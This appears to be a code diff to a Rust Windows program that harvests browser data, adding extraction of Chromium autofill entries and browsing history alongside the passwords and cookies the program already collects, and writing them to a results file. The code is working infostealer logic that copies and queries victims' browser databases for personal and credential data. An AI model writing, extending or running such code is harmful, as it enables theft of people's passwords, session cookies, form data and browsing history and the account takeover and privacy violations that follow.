@@ -22,10 +22,25 @@ struct CookieData {
 }
 
 #[derive(Serialize, Deserialize, Debug)]
+struct HistoryData {
+    url: String,
+    title: String,
+    visit_count: i32,
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+struct AutofillData {
+    name: String,
+    value: String,
+}
+
+#[derive(Serialize, Deserialize, Debug)]
 struct ProfileData {
     name: String,
     passwords: Vec<PasswordData>,
     cookies: Vec<CookieData>,
+    history: Vec<HistoryData>,
+    autofill: Vec<AutofillData>,
 }
 use winapi::{
     shared::{
@@ -281,6 +296,8 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
             name: profile.clone(),
             passwords: Vec::new(),
             cookies: Vec::new(),
+            history: Vec::new(),
+            autofill: Vec::new(),
         };
 
         // Passwords Extraction
@@ -308,6 +325,57 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
                                         });
                                     }
                                 }
+                            }
+                        }
+                    }
+                }
+                let _ = fs::remove_file(temp_db);
+            }
+        }
+
+        // Autofill Extraction
+        let web_data_db = profile_path.join("Web Data");
+        if web_data_db.exists() {
+            let temp_db = profile_output_path.join("Web_Data.tmp");
+            if fs::copy(&web_data_db, &temp_db).is_ok() {
+                if let Ok(conn) = rusqlite::Connection::open(&temp_db) {
+                    if let Ok(mut stmt) = conn.prepare("SELECT name, value FROM autofill") {
+                        let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?)));
+                        if let Ok(rows) = rows {
+                            let _ = writeln!(results_file, "\n--- Otomatik Doldurma (Autofill) ---");
+                            for row in rows.flatten() {
+                                let (name, value) = row;
+                                let _ = writeln!(results_file, "Name: {} | Value: {}", name, value);
+                                profile_data.autofill.push(AutofillData {
+                                    name,
+                                    value,
+                                });
+                            }
+                        }
+                    }
+                }
+                let _ = fs::remove_file(temp_db);
+            }
+        }
+
+        // History Extraction
+        let history_db = profile_path.join("History");
+        if history_db.exists() {
+            let temp_db = profile_output_path.join("History.tmp");
+            if fs::copy(&history_db, &temp_db).is_ok() {
+                if let Ok(conn) = rusqlite::Connection::open(&temp_db) {
+                    if let Ok(mut stmt) = conn.prepare("SELECT url, title, visit_count FROM urls") {
+                        let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, i32>(2)?)));
+                        if let Ok(rows) = rows {
+                            let _ = writeln!(results_file, "\n--- Geçmiş (History) ---");
+                            for row in rows.flatten() {
+                                let (url, title, visit_count) = row;
+                                let _ = writeln!(results_file, "URL: {} | Title: {} | Visits: {}", url, title, visit_count);
+                                profile_data.history.push(HistoryData {
+                                    url,
+                                    title,
+                                    visit_count,
+                                });
                             }
                         }
                     }
